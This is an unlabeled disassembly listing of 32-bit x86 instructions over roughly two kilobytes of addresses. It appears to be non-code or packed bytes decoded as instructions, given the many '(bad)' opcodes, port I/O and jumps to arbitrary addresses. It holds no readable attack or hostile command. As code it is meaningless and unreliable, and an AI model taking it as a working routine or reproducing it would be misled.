  41d3cb:	fmul   DWORD PTR [ebx+esi*8]
  41d3ce:	or     eax,0xc8351155
  41d3d3:	or     BYTE PTR [edi+ebx*8+0x9],dh
  41d3d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3d8:	jne    0x41d3b8
  41d3da:	jl     0x41d43f
  41d3dc:	mov    dl,0x73
  41d3de:	push   edx
  41d3df:	push   ebx
  41d3e0:	in     al,dx
  41d3e1:	jbe    0x41d3e5
  41d3e3:	repz jbe 0x41d45f
  41d3e6:	sahf   
  41d3e7:	xor    BYTE PTR [eax+0x22ccdf03],al
  41d3ed:	jp     0x41d3d6
  41d3ef:	ror    BYTE PTR [edi],0x9a
  41d3f2:	int3   
  41d3f3:	and    DWORD PTR [edi],edi
  41d3f5:	adc    edx,DWORD PTR [esi]
  41d3f7:	int    0xee
  41d3f9:	pusha  
  41d3fa:	call   DWORD PTR [ecx-0x510a99ac]
  41d400:	sub    al,0x8a
  41d402:	hlt    
  41d403:	inc    esi
  41d404:	mul    DWORD PTR [edx+0x61]
  41d407:	jmp    0x41d438
  41d409:	jae    0x41d3f8
  41d40b:	sub    bh,BYTE PTR ds:0xd2ef30d4
  41d411:	mov    ecx,0xfe21b306
  41d416:	mov    eax,0x6c9921f7
  41d41b:	cld    
  41d41c:	in     eax,dx
  41d41d:	push   esp
  41d41e:	pushf  
  41d41f:	(bad)  [ebx+0x76]
  41d422:	aaa    
  41d423:	int    0x82
  41d425:	scas   eax,DWORD PTR es:[edi]
  41d426:	jno    0x41d3e1
  41d428:	fs int 0xbe
  41d42b:	push   DWORD PTR [edx-0xe]
  41d42e:	adc    eax,0x5fdddcfc
  41d433:	jo     0x41d3fc
  41d435:	div    BYTE PTR [ecx]
  41d437:	sti    
  41d438:	mov    DWORD PTR [ebp+0x11],edi
  41d43b:	sar    DWORD PTR gs:[eax-0x1b],0x3a
  41d440:	push   ss
  41d441:	addr16 mov ds:0xedfd,al
  41d445:	or     al,0xe
  41d447:	out    0x32,al
  41d449:	jle    0x41d41d
  41d44b:	mov    ds:0x32d93a6f,al
  41d450:	xor    edx,DWORD PTR [eax+0x29]
  41d453:	cmc    
  41d454:	jge    0x41d49d
  41d456:	adc    eax,0x11c75ffa
  41d45b:	pop    ds
  41d45c:	cmp    BYTE PTR [edi],cl
  41d45e:	adc    eax,0x47924b4f
  41d463:	(bad)  
  41d464:	jl     0x41d3f1
  41d466:	xor    DWORD PTR [eax-0x250fc89f],0x5ebbdfbd
  41d470:	pushf  
  41d471:	test   DWORD PTR [eax*2+0x68397320],eax
  41d478:	lock xchg DWORD PTR ds:0xcf8db9d6,ecx
  41d47f:	aas    
  41d480:	es adc al,bl
  41d483:	inc    edi
  41d484:	pushf  
  41d485:	xchg   ebp,eax
  41d486:	not    BYTE PTR [esi+0x6051aa28]
  41d48c:	inc    ebx
  41d48d:	ins    BYTE PTR es:[edi],dx
  41d48e:	es loop 0x41d49c
  41d491:	(bad)  
  41d492:	jo     0x41d4c7
  41d494:	add    al,0x60
  41d496:	mov    al,0x78
	...
  41d514:	daa    
  41d515:	and    eax,0xbb873b85
  41d51a:	mov    edi,0xe22d13d
  41d51f:	pusha  
  41d520:	cmp    edi,DWORD PTR [edx]
  41d522:	jecxz  0x41d4c8
  41d524:	pop    ebp
  41d525:	jno    0x41d528
  41d527:	add    BYTE PTR [edi+eax*1+0x0],ch
  41d52b:	add    BYTE PTR [ecx-0x76],cl
  41d52e:	and    al,0x3b
  41d530:	pusha  
  41d531:	dec    eax
  41d532:	inc    DWORD PTR [eax-0x67d4decd]
  41d538:	ret    0x2f75
  41d53b:	in     eax,0xb9
  41d53d:	fs fwait
  41d53f:	adc    DWORD PTR [edx],0x61
  41d542:	xchg   edx,eax
  41d543:	into   
  41d544:	sbb    al,BYTE PTR cs:[edx+eax*2+0x61]
  41d549:	out    dx,eax
  41d54a:	scas   eax,DWORD PTR es:[edi]
  41d54b:	test   al,0xb7
  41d54d:	lock bound ebp,QWORD PTR [eax+edi*4-0x73]
  41d552:	mov    ebp,0xb104c044
  41d557:	leave  
  41d558:	test   DWORD PTR es:[ebx+ecx*2+0x2c30ea94],eax
  41d560:	pop    edx
  41d561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d562:	sub    eax,0x66f8857f
  41d567:	add    ebp,DWORD PTR [esi]
  41d569:	xchg   ebp,eax
  41d56a:	mov    ah,BYTE PTR gs:[ecx+0x41745de9]
  41d571:	fbstp  TBYTE PTR [esi+esi*2]
  41d574:	mov    ds:0x14d9c162,al
  41d579:	mov    esi,0x7e38d99d
  41d57e:	mov    al,0xcd
  41d580:	loop   0x41d574
  41d582:	mov    al,ds:0x7d062e16
  41d587:	push   ss
  41d588:	xchg   edi,eax
  41d589:	pushf  
  41d58a:	pop    edi
  41d58b:	sbb    al,0x4a
  41d58d:	retf   0x979f
  41d590:	test   eax,0x472f7b48
  41d595:	jmp    0x29b1439d
  41d59a:	mov    esi,0x3794a293
  41d59f:	or     bh,ah
  41d5a1:	xchg   ebp,eax
  41d5a2:	pop    ecx
  41d5a3:	pop    ss
  41d5a4:	sub    ecx,DWORD PTR [ebp+ecx*1-0x43904cb2]
  41d5ab:	and    dh,ah
  41d5ad:	inc    ebx
  41d5ae:	stos   BYTE PTR es:[edi],al
  41d5af:	shl    dl,1
  41d5b1:	lods   al,BYTE PTR ds:[esi]
  41d5b2:	out    0x57,eax
  41d5b4:	or     al,0x7e
  41d5b6:	sbb    edx,ebx
  41d5b8:	call   0x94b3:0x5fd738b2
  41d5bf:	pop    edi
  41d5c0:	jg     0x41d5e0
  41d5c2:	pop    ss
  41d5c3:	sbb    BYTE PTR [eax+0x8],ah
  41d5c6:	outs   dx,BYTE PTR ds:[esi]
  41d5c7:	lods   eax,DWORD PTR ds:[esi]
  41d5c8:	inc    eax
  41d5c9:	push   ds
  41d5ca:	ja     0x41d59f
  41d5cc:	xchg   esi,eax
  41d5cd:	outs   dx,BYTE PTR ds:[esi]
  41d5ce:	jnp    0x41d559
  41d5d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5d1:	dec    esp
  41d5d2:	(bad)  
  41d5d3:	dec    ebp
  41d5d4:	lock into 
  41d5d6:	mov    WORD PTR ds:0x81df0061,ds
  41d5dc:	rol    DWORD PTR ds:0xc9efefb4,0x46
  41d5e3:	cli    
  41d5e4:	jno    0x41d633
  41d5e6:	lds    edi,FWORD PTR [ebp+eax*1-0x648ded5f]
  41d5ed:	ds jne 0x41d5c8
  41d5f0:	shl    DWORD PTR [ecx],0x6e
  41d5f3:	out    dx,eax
  41d5f4:	xchg   edi,ecx
  41d5f6:	jp     0x41d5e0
  41d5f8:	pop    eax
  41d5f9:	and    esp,DWORD PTR [ebp-0x2d2c1f98]
  41d5ff:	mov    DWORD PTR [ecx+0x66],edx
  41d602:	mov    ds,ebx
  41d604:	(bad)  
  41d605:	pop    esp
  41d606:	ds jge 0x41d639
  41d609:	inc    eax
  41d60a:	add    DWORD PTR [ebx-0x62d9c118],ebp
  41d610:	adc    al,0x9
  41d612:	dec    edx
  41d613:	call   0xe99b:0x6ffdc898
  41d61a:	mov    ch,0x90
  41d61c:	jns    0x41d5c6
  41d61e:	(bad)  
  41d61f:	pop    ss
  41d620:	jl     0x41d5e0
  41d622:	call   0xf93e:0xc5dbac87
  41d629:	sub    eax,0xee7bf6da
  41d62e:	cmp    dl,BYTE PTR [esi-0x3c320e09]
  41d634:	jo     0x41d69f
  41d636:	mov    esi,0x2151f845
  41d63b:	cld    
  41d63c:	ror    DWORD PTR [edx+0x20d2e053],1
  41d642:	push   edi
  41d643:	xchg   edi,eax
  41d644:	or     dh,BYTE PTR [eax-0x47]
  41d647:	idiv   BYTE PTR [ebp-0x3a]
  41d64a:	fld    DWORD PTR [ebx-0x122eeff7]
  41d650:	fdivr  DWORD PTR [esi-0x4dfe8f9a]
  41d656:	push   0x8
  41d658:	push   ss
  41d659:	adc    al,0x64
  41d65b:	aad    0x6d
  41d65d:	cwde   
  41d65e:	and    BYTE PTR [edi+0x4cf8fd8c],ah
  41d664:	stc    
  41d665:	es out 0x26,eax
  41d668:	call   DWORD PTR [esi+0x7c]
  41d66b:	inc    ecx
  41d66c:	mov    esi,DWORD PTR [esp+ebp*1-0x14]
  41d670:	or     eax,ebx
  41d672:	cmp    dh,cl
  41d674:	xor    DWORD PTR [edx-0x11a2bced],eax
  41d67a:	arpl   WORD PTR [eax+0x27a72bc],dx
  41d680:	int    0x94
  41d682:	xchg   edx,eax
  41d683:	pop    esi
  41d684:	aaa    
  41d685:	mov    esi,0xaea63add
  41d68a:	push   ebx
  41d68b:	int3   
  41d68c:	outs   dx,DWORD PTR ds:[esi]
  41d68d:	sbb    dh,al
  41d68f:	jbe    0x41d6b4
  41d691:	push   esi
  41d692:	adc    bl,bl
  41d694:	mov    dl,0xea
  41d696:	sar    DWORD PTR [edi+ebp*4],1
  41d699:	inc    eax
  41d69a:	cmp    DWORD PTR [esi],ebx
  41d69c:	mov    bl,0x64
  41d69e:	addr16 mov bh,0xd7
  41d6a1:	inc    eax
  41d6a2:	frstor [edi]
  41d6a4:	add    eax,0x7326a653
  41d6a9:	dec    ebx
  41d6aa:	cmp    eax,0x444b8256
  41d6af:	icebp  
  41d6b0:	and    al,0x3c
  41d6b2:	stos   DWORD PTR es:[edi],eax
  41d6b3:	sub    BYTE PTR [ebx],ch
  41d6b5:	and    BYTE PTR [eax+ecx*2],ch
  41d6b8:	sar    DWORD PTR [esi+ecx*1+0x48ab17f4],cl
  41d6bf:	dec    esi
  41d6c0:	loopne 0x41d681
  41d6c2:	jg     0x41d64c
  41d6c4:	retf   0x894b
  41d6c7:	jecxz  0x41d723
  41d6c9:	mov    edi,DWORD PTR [esi+0x5090631a]
  41d6cf:	pop    esp
  41d6d0:	xor    DWORD PTR [ebp+0x3bbe7b85],ebx
  41d6d6:	fst    DWORD PTR [esi]
  41d6d8:	sbb    al,0xc6
  41d6da:	in     eax,0xf3
  41d6dc:	mov    bl,0x32
  41d6de:	aas    
  41d6df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6e0:	inc    esp
  41d6e1:	xor    DWORD PTR [edi+0x3310bb01],ebx
  41d6e7:	pop    ebp
  41d6e8:	xchg   BYTE PTR [ebx+edx*1-0x23140a2f],al
  41d6ef:	retf   0x1d42
  41d6f2:	push   cs
  41d6f3:	push   0xc6c7db06
  41d6f8:	aad    0x4c
  41d6fa:	cld    
  41d6fb:	add    al,0x2e
  41d6fd:	(bad)  
  41d6fe:	(bad)  
  41d6ff:	outs   dx,DWORD PTR ds:[esi]
  41d700:	inc    esp
  41d701:	pushf  
  41d702:	imul   ecx,eax,0x3d3a3dd9
  41d708:	xor    BYTE PTR [ebx],bh
  41d70a:	sub    BYTE PTR [eax-0x7c214028],dh
  41d710:	and    ecx,esp
  41d712:	aaa    
  41d713:	push   0xffffffb7
  41d715:	stos   DWORD PTR es:[edi],eax
  41d716:	cmc    
  41d717:	mov    dh,0x1e
  41d719:	add    BYTE PTR [edx-0x261c4de7],cl
  41d71f:	or     eax,DWORD PTR [edx-0x4c8e363f]
  41d725:	(bad)  
  41d726:	pop    edx
  41d727:	repnz push 0xffffffc4
  41d72a:	mov    edx,0x8567b4d3
  41d72f:	jae    0x41d750
  41d731:	lds    eax,FWORD PTR [edi-0x39]
  41d734:	inc    ebp
  41d735:	xchg   esp,eax
  41d736:	imul   edi,DWORD PTR [ebx],0xa66a8f79
  41d73c:	inc    ebp
  41d73d:	popa   
  41d73e:	pop    esi
  41d73f:	inc    ecx
  41d740:	test   BYTE PTR [edi-0x41],dl
  41d743:	imul   ecx,DWORD PTR [ecx+0x44],0x90a15675
  41d74a:	jmp    0x3f85d308
  41d74f:	ins    BYTE PTR es:[edi],dx
  41d750:	jo     0x41d6ee
  41d752:	test   al,0xc1
  41d754:	mov    esp,edx
  41d756:	cld    
  41d757:	clc    
  41d758:	stos   BYTE PTR es:[edi],al
  41d759:	imul   ecx,DWORD PTR [edi],0x46
  41d75c:	inc    esi
  41d75d:	mov    fs,WORD PTR [eax-0x58]
  41d760:	dec    esi
  41d761:	cwde   
  41d762:	rcl    BYTE PTR [edx-0x4a],1
  41d765:	jae    0x41d769
  41d767:	ins    BYTE PTR es:[edi],dx
  41d768:	(bad)  
  41d769:	sbb    bh,ch
  41d76b:	iret   
  41d76c:	or     DWORD PTR [edx],esi
  41d76e:	sbb    ch,BYTE PTR [edi+eiz*2-0x35]
  41d772:	scas   eax,DWORD PTR es:[edi]
  41d773:	leave  
  41d774:	test   BYTE PTR [eax],ch
  41d776:	jg     0x41d7bc
  41d778:	sbb    ch,0xbf
  41d77b:	pop    edi
  41d77c:	mov    esi,DWORD PTR fs:0xdfc20b8a
  41d783:	inc    esi
  41d784:	call   0x69ccc55a
  41d789:	lods   al,BYTE PTR ds:[esi]
  41d78b:	mov    edi,0xe92e2f87
  41d790:	dec    edx
  41d791:	lahf   
  41d792:	pop    edx
  41d793:	jo     0x41d802
  41d795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d796:	es stos BYTE PTR es:[edi],al
  41d798:	dec    edi
  41d799:	push   0x216c8e2f
  41d79e:	(bad)  
  41d79f:	test   al,0xf4
  41d7a1:	sbb    BYTE PTR [ebx+0x193af048],0xad
  41d7a8:	jns    0x41d7d7
  41d7aa:	in     al,dx
  41d7ab:	ret    
  41d7ac:	mov    ah,0x21
  41d7ae:	mov    ch,0xf2
  41d7b0:	mul    DWORD PTR [eax-0x4510280c]
  41d7b6:	fs ret 0x7fd1
  41d7ba:	in     al,0x8e
  41d7bc:	mov    ds,WORD PTR [eax+0x1a]
  41d7bf:	jge    0x41d759
  41d7c1:	inc    ebp
  41d7c2:	popf   
  41d7c3:	cmp    eax,0x9a52854a
  41d7c8:	lods   al,BYTE PTR ds:[esi]
  41d7c9:	(bad)
  41d7cc:	out    dx,eax
  41d7cd:	scas   al,BYTE PTR es:[edi]
  41d7ce:	inc    ecx
  41d7cf:	xor    bh,BYTE PTR [edx-0x7d12eab7]
  41d7d5:	mov    ds:0xa47201d9,al
  41d7da:	xor    BYTE PTR [edi-0x7d],0x36
  41d7de:	fnstenv [ebx-0x1f]
  41d7e1:	adc    ecx,DWORD PTR [edx]
  41d7e3:	loop   0x41d79b
  41d7e5:	lds    ecx,FWORD PTR [ecx+0x7020aec7]
  41d7eb:	push   0x3b97bd2c
  41d7f0:	add    BYTE PTR [ebp-0x4c],ah
  41d7f3:	ret    0xeb40
  41d7f6:	imul   ecx,DWORD PTR ds:[eax+0x195c4f53],0xffffff81
  41d7fe:	push   es
  41d7ff:	test   ah,al
  41d801:	lahf   
  41d802:	inc    ebp
  41d803:	sbb    eax,0xff7f3373
  41d808:	jno    0x41d7a0
  41d80a:	adc    BYTE PTR [edx+ebp*4+0x63],ah
  41d80e:	sbb    al,0x2
  41d810:	jmp    0x26313aad
  41d815:	popa   
  41d816:	into   
  41d817:	mov    edi,0x660b03d
  41d81c:	pop    esi
  41d81d:	aad    0xcf
  41d81f:	out    0x12,al
  41d821:	push   ebp
  41d822:	imul   esp,ebp,0x29aecae7
  41d828:	lods   eax,DWORD PTR ds:[esi]
  41d829:	shl    BYTE PTR [ecx-0x71c07109],0xa8
  41d830:	rol    ebx,1
  41d832:	stc    
  41d833:	call   0x701b:0x7e2d8dbc
  41d83a:	mov    bh,0x47
  41d83c:	adc    eax,0x94d94413
  41d841:	xchg   edx,eax
  41d842:	cwde   
  41d843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d844:	scas   al,BYTE PTR es:[edi]
  41d845:	jl     0x41d7dc
  41d847:	xor    eax,0xc3f319b1
  41d84c:	pop    esp
  41d84d:	mov    bl,BYTE PTR ds:0x6a371983
  41d853:	out    0xc4,al
  41d855:	hlt    
  41d856:	mov    dh,BYTE PTR [ecx-0x75]
  41d859:	adc    BYTE PTR [ebp+0x66],ch
  41d85c:	shl    ebp,cl
  41d85e:	xchg   edi,eax
  41d85f:	pop    ecx
  41d860:	dec    ebx
  41d861:	push   edi
  41d862:	repz (bad) 
  41d864:	into   
  41d865:	push   ds
  41d866:	sbb    DWORD PTR [ebp-0x48],ebp
  41d869:	sti    
  41d86a:	repnz ss mov ebx,0xa13f924
  41d871:	outs   dx,DWORD PTR ds:[esi]
  41d872:	mov    edx,DWORD PTR [ecx]
  41d874:	lods   al,BYTE PTR ds:[esi]
  41d875:	popa   
  41d876:	and    al,0x62
  41d878:	mov    ah,0x79
  41d87a:	in     al,0xbe
  41d87c:	jg     0x41d812
  41d87e:	pcmpgtd mm1,QWORD PTR [edx+ecx*8-0x42]
  41d883:	ins    BYTE PTR es:[edi],dx
  41d884:	add    al,0x36
  41d886:	xor    eax,0x75d9e671
  41d88b:	cs push ss
  41d88d:	adc    ah,BYTE PTR [eax]
  41d88f:	ds out dx,eax
  41d891:	dec    edx
  41d892:	test   eax,esp
  41d894:	fsubrp st(5),st
  41d896:	nop
  41d897:	xor    DWORD PTR [esi+0x4f],ecx
  41d89a:	sbb    dl,ah
  41d89c:	ins    DWORD PTR es:[edi],dx
  41d89d:	das    
  41d89e:	shr    BYTE PTR [ebx+0x31540ee5],0x40
  41d8a5:	inc    eax
  41d8a6:	jmp    0x41d909
  41d8a8:	inc    esp
  41d8a9:	inc    eax
  41d8aa:	push   0xf333349
  41d8af:	div    BYTE PTR [eax+edx*4]
  41d8b2:	add    ebp,DWORD PTR [edi]
  41d8b4:	sar    BYTE PTR [edi+0x7f],0xc
  41d8b8:	push   ebp
  41d8b9:	sub    edi,DWORD PTR [ecx+0x1992305d]
  41d8bf:	xlat   BYTE PTR ds:[ebx]
  41d8c0:	ja     0x41d8d0
  41d8c2:	sub    BYTE PTR [ebx+0x31],0xc7
  41d8c6:	fiadd  DWORD PTR [eax+0x14773c0d]
  41d8cc:	addr16 xchg ecx,eax
  41d8ce:	xchg   esp,eax
  41d8cf:	push   ecx
  41d8d0:	cs dec edx
  41d8d2:	in     al,0x99
  41d8d4:	push   ebp
  41d8d5:	fild   DWORD PTR [eax-0x4d]
  41d8d9:	adc    eax,0x76a15bac
  41d8de:	fwait
  41d8df:	add    eax,0x95e3efae
  41d8e4:	inc    edx
  41d8e5:	push   ds
  41d8e6:	sbb    cl,BYTE PTR [esi+0x5d]
  41d8e9:	dec    eax
  41d8ea:	pusha  
  41d8eb:	xchg   DWORD PTR [eax+0x5d93e101],eax
  41d8f1:	rcl    al,0xf6
  41d8f4:	mov    eax,ds:0xa4fa1e3
  41d8f9:	fild   WORD PTR [esi+edi*1-0x45743f35]
  41d900:	adc    ecx,ebx
  41d902:	out    dx,eax
  41d903:	adc    dh,BYTE PTR [ebp+0x4c21f5e6]
  41d909:	sbb    eax,0xb4d85c28
  41d90e:	call   0xde3326da
  41d913:	aad    0xde
  41d915:	fwait
  41d916:	push   edi
  41d917:	add    al,0xff
  41d919:	arpl   WORD PTR [ebx],bp
  41d91b:	pop    esp
  41d91c:	clc    
  41d91d:	dec    esp
  41d91e:	arpl   WORD PTR [esi-0x3b],bp
  41d921:	out    0xd7,al
  41d923:	shr    edx,cl
  41d925:	scas   eax,DWORD PTR es:[edi]
  41d926:	push   esi
  41d927:	js     0x41d8c3
  41d929:	(bad)  
  41d92a:	imul   ecx,esi,0x484db422
  41d930:	xor    cl,BYTE PTR [ecx+0x3d6e1231]
  41d936:	xor    ecx,DWORD PTR [eax+0x592836ef]
  41d93c:	adc    al,0x25
  41d93e:	rol    DWORD PTR [edx+0x1d4da3c8],cl
  41d944:	inc    esi
  41d945:	frstor ds:0x37b421d1
  41d94b:	sbb    DWORD PTR [eax],ebp
  41d94d:	mov    edx,0xab99b24a
  41d952:	xor    DWORD PTR [ecx+0x3804ebfe],edi
  41d958:	addr16 jl 0x41d9af
  41d95b:	aam    0xd2
  41d95d:	or     al,0xe9
  41d95f:	xchg   ecx,eax
  41d960:	outs   dx,DWORD PTR ds:[esi]
  41d961:	add    sp,bx
  41d964:	cwde   
  41d965:	inc    edi
  41d966:	cmc    
  41d967:	sti    
  41d968:	xor    DWORD PTR ds:0xd2a07c6f,ebp
  41d96e:	dec    ebp
  41d96f:	out    0x89,eax
  41d971:	mov    ah,0xd3
  41d973:	sub    BYTE PTR [edi-0x3e2462d1],ch
  41d979:	in     al,dx
  41d97a:	loopne 0x41d967
  41d97c:	in     eax,dx
  41d97d:	jmp    0x41d9c0
  41d97f:	in     al,dx
  41d980:	push   0x3211428a
  41d985:	not    esp
  41d987:	fiadd  DWORD PTR [eax+0x43]
  41d98a:	ret    0xfcae
  41d98d:	mov    esp,0xfecea938
  41d992:	inc    edx
  41d993:	add    ecx,DWORD PTR [eax+0x2c71fd1f]
  41d999:	adc    BYTE PTR [edi-0x57],cl
  41d99c:	push   esi
  41d99d:	xor    DWORD PTR [ebx],0x43ec917f
  41d9a3:	jno    0x41d964
  41d9a5:	popa   
  41d9a6:	push   ebx
  41d9a7:	dec    ebx
  41d9a8:	adc    al,0xa3
  41d9aa:	das    
  41d9ab:	add    al,0x40
  41d9ad:	aas    
  41d9ae:	jecxz  0x41d94b
  41d9b0:	dec    ecx
  41d9b1:	dec    edx
  41d9b2:	dec    edi
  41d9b3:	and    DWORD PTR [ebp-0x72],esp
  41d9b6:	mov    ecx,0x5c0a75be
  41d9bb:	pop    esp
  41d9bc:	rcr    DWORD PTR [edi+0x73],1
  41d9bf:	jle    0x41d989
  41d9c1:	cmp    dh,BYTE PTR [ecx-0x6a]
  41d9c4:	in     eax,dx
  41d9c5:	cld    
  41d9c6:	call   0xad20:0x1e9eb6fd
  41d9cd:	aas    
  41d9ce:	in     eax,dx
  41d9cf:	test   eax,0x72ad2a99
  41d9d4:	mov    ah,0x58
  41d9d6:	mov    esp,0xf320f6ec
  41d9db:	or     BYTE PTR [edx-0x6b09522a],ah
  41d9e1:	push   ds
  41d9e2:	sub    ch,BYTE PTR [eax]
  41d9e4:	out    0x47,eax
  41d9e6:	xchg   BYTE PTR [esi+0x7a112b],dl
  41d9ec:	xchg   esi,eax
  41d9ed:	inc    ebp
  41d9ee:	or     edx,eax
  41d9f0:	xor    eax,DWORD PTR [ecx-0x1a]
  41d9f3:	addr16 ret 0xf35d
  41d9f7:	inc    ebx
  41d9f8:	jo     0x41d9fe
  41d9fa:	xchg   dh,dh
  41d9fc:	xchg   ebx,eax
  41d9fd:	into   
  41d9fe:	test   DWORD PTR [ecx+ebp*2],0xa49089f6
  41da05:	psubb  mm5,QWORD PTR [ebx]
  41da08:	jmp    0x41da14
  41da0a:	cld    
  41da0b:	test   BYTE PTR [edx-0x70905363],bl
  41da11:	adc    ebx,DWORD PTR [esi+0xce8a04f]
  41da17:	push   ebx
  41da18:	add    al,0x5c
  41da1a:	fdiv   st(6),st
  41da1c:	pusha  
  41da1d:	push   es
  41da1e:	xor    eax,0xb5f12c7f
  41da23:	cwde   
  41da24:	stos   BYTE PTR es:[edi],al
  41da25:	sbb    eax,0xeec4036
  41da2a:	jns    0x41d9eb
  41da2c:	or     edi,ebx
  41da2e:	sub    al,0x26
  41da30:	fld    DWORD PTR [ebx-0x76de21e]
  41da36:	xchg   esi,eax
  41da37:	iret   
  41da38:	ja     0x41d9d0
  41da3a:	test   BYTE PTR [ebp-0x9],al
  41da3d:	fldenv [edx+ebx*8+0x4e]
  41da41:	js     0x41da45
  41da43:	push   0x2e
  41da45:	rcr    DWORD PTR ds:0x94d32ed8,0xd0
  41da4c:	jp     0x41d9d7
  41da4e:	xor    al,0x2b
  41da50:	push   ss
  41da51:	xchg   ebx,eax
  41da52:	lds    eax,FWORD PTR [esi]
  41da54:	ror    DWORD PTR [ebx+edx*8],0x6a
  41da58:	lods   al,BYTE PTR ds:[esi]
  41da59:	enter  0x3b36,0x69
  41da5d:	mov    cl,0x1b
  41da5f:	push   edx
  41da60:	ins    DWORD PTR es:[edi],dx
  41da61:	out    0x23,al
  41da63:	aad    0x7e
  41da65:	(bad)  
  41da66:	jnp    0x41dac9
  41da68:	jo     0x41da13
  41da6a:	imul   edx,DWORD PTR [esi],0x4737473e
  41da70:	mov    dl,0xf7
  41da72:	add    al,0x33
  41da74:	cwde   
  41da75:	dec    esi
  41da76:	adc    eax,0x387e4c69
  41da7b:	xlat   BYTE PTR ds:[ebx]
  41da7c:	mov    edx,0xc066229e
  41da81:	push   eax
  41da82:	and    eax,0x5e5650ab
  41da87:	mov    eax,0x63227b4b
  41da8c:	dec    edi
  41da8d:	inc    ecx
  41da8e:	push   es
  41da8f:	push   ebx
  41da90:	dec    DWORD PTR [esi+eiz*8-0x49893cbd]
  41da97:	inc    edx
  41da98:	imul   eax,DWORD PTR [eax+ecx*2],0x3e9a732e
  41da9f:	or     al,0xf
  41daa1:	aad    0x3a
  41daa3:	test   BYTE PTR [edx-0x3d],0x8f
  41daa7:	push   ebp
  41daa8:	or     edx,ecx
  41daaa:	clc    
  41daab:	out    0xf6,al
  41daad:	fadd   DWORD PTR [ebp+0x30218f92]
  41dab3:	xchg   esi,eax
  41dab4:	push   ebx
  41dab5:	add    ecx,esi
  41dab7:	push   edi
  41dab8:	cld    
  41dab9:	jg     0x41db34
  41dabb:	out    0xf0,eax
  41dabd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dabe:	pop    ecx
  41dabf:	pop    esp
  41dac0:	lods   eax,DWORD PTR ds:[esi]
  41dac1:	test   eax,0x501a01d0
  41dac6:	cdq    
  41dac7:	addr16 dec edx
  41dac9:	(bad)  
  41daca:	cmp    DWORD PTR [ebx-0x52d2d861],eax
  41dad0:	sub    DWORD PTR [esi-0x6c],esp
  41dad3:	mov    esi,0xa6f458f0
  41dad8:	sti    
  41dad9:	add    dh,BYTE PTR [esp+edi*8+0x1ee54ed2]
  41dae0:	mov    dl,0x56
  41dae2:	inc    ebx
  41dae3:	mov    eax,ds:0xc4dacfc4
  41dae8:	sub    ch,bh
  41daea:	sbb    BYTE PTR [ecx+eax*1-0x44],ch
  41daee:	pop    eax
  41daef:	in     al,dx
  41daf0:	jp     0x41daf4
  41daf2:	sbb    al,0x90
  41daf4:	pop    ecx
  41daf5:	push   edx
  41daf6:	pushf  
  41daf7:	ss in  eax,0x6f
  41dafa:	jl     0x41db55
  41dafc:	jb     0x41db21
  41dafe:	out    0xd5,eax
  41db00:	add    eax,0x1d0d8e2c
  41db05:	shl    DWORD PTR ds:0xdbb38835,1
  41db0b:	mov    edx,0xef2ee8c
  41db10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db11:	push   ecx
  41db12:	jl     0x41db2f
  41db14:	cmp    bl,ah
  41db16:	add    eax,0xaea77be0
  41db1b:	inc    ecx
  41db1c:	jmp    0xf674:0x88007370
  41db23:	(bad)  
  41db25:	mov    DWORD PTR [ebp+0x5],0xd2d8b5c2
  41db2c:	call   0x1c5e:0xd0cb4fa
  41db33:	stos   DWORD PTR es:[edi],eax
  41db34:	push   0xb65fd851
  41db39:	sbb    ch,BYTE PTR [ecx+0x130576ca]
  41db3f:	pop    ds
  41db40:	jmp    0x41db45
  41db42:	jbe    0x41db1f
  41db44:	jmp    0x25cd:0xe12ece50
  41db4b:	aaa    
  41db4c:	sbb    al,0x1
  41db4e:	xchg   edi,eax
  41db4f:	mov    ch,0xd4
  41db51:	hlt    
  41db52:	mov    fs,ecx
  41db54:	sbb    ah,BYTE PTR [ecx-0x31]
  41db57:	rol    dl,0xec
  41db5a:	(bad)  
  41db5b:	(bad)  
  41db5d:	jo     0x41db2e
  41db5f:	pop    ebx
  41db60:	addr16 int 0x31
  41db63:	push   cs
  41db64:	jmp    0x41db10
  41db66:	out    dx,eax
  41db67:	cmc    
  41db68:	inc    esi
  41db69:	and    dh,BYTE PTR [ebx]
  41db6b:	xor    eax,0x67dfa4d9
  41db70:	pop    edi
  41db71:	sub    al,0xac
  41db73:	out    0xe,eax
  41db75:	daa    
  41db76:	hlt    
  41db77:	rcr    DWORD PTR [esi+0x5d],0x32
  41db7b:	pop    ebp
  41db7c:	pop    edi
  41db7d:	adc    ecx,DWORD PTR [ecx-0x51]
  41db80:	jmp    0xb217e2ff
  41db85:	pop    ecx
  41db86:	cs (bad) 
  41db88:	fcomp  QWORD PTR [edi]
  41db8a:	cmp    ebx,DWORD PTR [ecx+0xf]
  41db8d:	mov    al,0xec
  41db8f:	sub    esp,DWORD PTR [esi]
  41db91:	ret    
  41db92:	jb     0x41dc04
  41db94:	sbb    eax,0x620f0bde
  41db99:	push   ds
  41db9a:	push   ebx
  41db9b:	dec    eax
  41db9c:	push   edi
  41db9d:	fld    QWORD PTR [esi]
  41db9f:	add    dl,0x8e
  41dba2:	push   ebx
  41dba3:	jg     0x41dc15
  41dba5:	ret    
  41dba6:	jnp    0x41dbbe
  41dba8:	aam    0xa2
  41dbaa:	inc    ebx
  41dbab:	inc    esi
  41dbac:	stos   BYTE PTR es:[edi],al
  41dbad:	lock sbb edx,ebp
  41dbb0:	mov    ch,0x9
  41dbb2:	mov    eax,0x497272a1
  41dbb7:	or     al,0xc1
  41dbb9:	popa   
  41dbba:	ret    0x26f8
  41dbbd:	xchg   BYTE PTR [edx+eax*4+0x21],cl
  41dbc1:	repz dec esp
  41dbc3:	idiv   BYTE PTR [ebx]
  41dbc5:	dec    edi
  41dbc6:	call   0x280fb759
  41dbcb:	and    edi,DWORD PTR [edx-0x5d]
  41dbce:	jmp    0x54e7:0xa7b406fc
  41dbd5:	jp     0x41dbe0
  41dbd7:	aad    0x7b
  41dbd9:	dec    esp
  41dbda:	dec    DWORD PTR [esi-0xd]
  41dbdd:	inc    esp
  41dbde:	stos   BYTE PTR es:[edi],al
  41dbdf:	dec    esp
  41dbe0:	pop    ebp
